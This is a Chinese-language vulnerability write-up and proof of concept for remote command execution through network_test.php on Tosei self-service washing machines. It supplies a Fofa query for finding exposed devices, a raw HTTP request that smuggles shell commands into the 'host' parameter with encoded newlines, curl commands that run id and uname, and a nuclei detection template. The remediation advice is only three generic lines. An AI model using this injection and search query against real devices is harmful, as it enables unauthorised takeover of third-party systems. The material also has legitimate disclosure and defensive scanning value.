# Tosei自助洗衣机 network_test.php 远程命令执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | Tosei自助洗衣机 network_test.php 远程命令执行漏洞 |
| 漏洞类型 | RCE（远程命令执行） |
| 组件名称 | Tosei 自助洗衣机 |
| 影响版本 | Tosei 自助洗衣机 |
| 漏洞日期 | 2026-03-28 |

## 漏洞概述

Tosei 自助洗衣机 web 管理端存在安全漏洞，攻击者利用该漏洞可以通过 `network_test.php` 的命令执行,在服务器任意执行代码，获取服务器权限，进而控制整个服务器。

## Fofa查询语法

```
body="tosei_login_check.php"
```

## 漏洞复现

### POC

```http
POST /cgi-bin/network_test.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0S X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

host=%0aid%0a&command=ping
```

### 特征

- 请求路径：`/cgi-bin/network_test.php`
- 请求方法：POST
- 参数：`host` 和 `command`
- 响应特征：命令执行结果回显

### 验证命令

```bash
# 简单验证
curl -X POST "http://TARGET/cgi-bin/network_test.php" -d "host=%0aid%0a&command=ping"

# 获取系统信息
curl -X POST "http://TARGET/cgi-bin/network_test.php" -d "host=%0auname%20-a%0a&command=ping"
```

 检测脚本

```yaml
﻿id: tosei-network-test-rce

info:
  name: Tosei network_test.php RCE
  author: 实战安全研究
  severity: critical
  description: Tosei Self-Service Washing Machine network_test.php Remote Command Execution
  tags: tosei,rce,network-test
  reference:
    - https://blog.wuyaoxuexi.cn

requests:
  - method: POST
    path:
      - "/cgi-bin/network_test.php"
    body: "host=%0aid%0a&command=ping"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: or

      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "(root|www-data|admin):.*:.*:"



```


## 漏洞修复建议

1. 建议联系厂商打补丁或升级版本。
2. 增加Web应用防火墙防护。
3. 关闭互联网暴露面或接口设置访问权限。